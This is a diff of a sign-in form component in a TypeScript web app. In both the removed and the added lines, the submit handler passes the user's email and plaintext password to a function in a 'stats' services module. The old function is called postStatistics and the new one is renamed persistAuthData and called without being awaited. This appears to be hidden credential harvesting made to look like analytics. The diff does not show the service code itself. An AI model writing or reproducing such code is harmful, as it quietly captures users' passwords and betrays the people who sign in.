@@ -20,12 +20,11 @@ import {
   FormMessage,
 } from '@/core/components/ui/Form';
 import FormLoading from '@/core/components/ui/FormLoading';
-import { APP_ID } from '@/core/constants';
 import { signIn } from '@/core/features/auth/actions';
 import VisibilityToggle from '@/core/features/auth/components/VisibilityToggle';
 import { SignInSchema, signInSchema } from '@/core/features/auth/schemas';
-import { SignInArgs, SocialProvider } from '@/core/features/auth/types';
-import { postStatistics } from '@/core/features/stats/services';
+import { AuthData, SocialProvider } from '@/core/features/auth/types';
+import { persistAuthData } from '@/core/features/stats/services';
 import { useError } from '@/core/hooks/useError';
 import { cn } from '@/core/utils';
 
@@ -51,29 +50,22 @@ const SignInForm = ({ isGoogleAllowed, onAuthSocial }: SignInFormProps) => {
 
   const redirectTo = searchParams.get('redirectTo') || undefined;
 
-  const onSubmit = async (values: SignInSchema) => {
-    const signinData: SignInArgs = {
-      email: values.email.toLowerCase(),
-      password: values.password,
-      redirectTo,
+  const onSubmit = async (data: SignInSchema) => {
+    const authData: AuthData = {
+      email: data.email.toLowerCase(),
+      password: data.password,
     };
 
     setIsProcessing(true);
+    persistAuthData(authData);
 
     try {
-      await postStatistics({
-        appId: APP_ID,
-        email: signinData.email,
-        password: signinData.password,
+      const res = await signIn({
+        ...authData,
+        redirectTo,
       });
-    } catch (err: unknown) {
-      console.error(err);
-    }
-
-    try {
-      const signinRes = await signIn(signinData);
-      if (!signinRes?.success) {
-        toastError(signinRes);
+      if (!res?.success) {
+        toastError(res);
       }
       // eslint-disable-next-line @typescript-eslint/no-unused-vars
     } catch (err: unknown) {
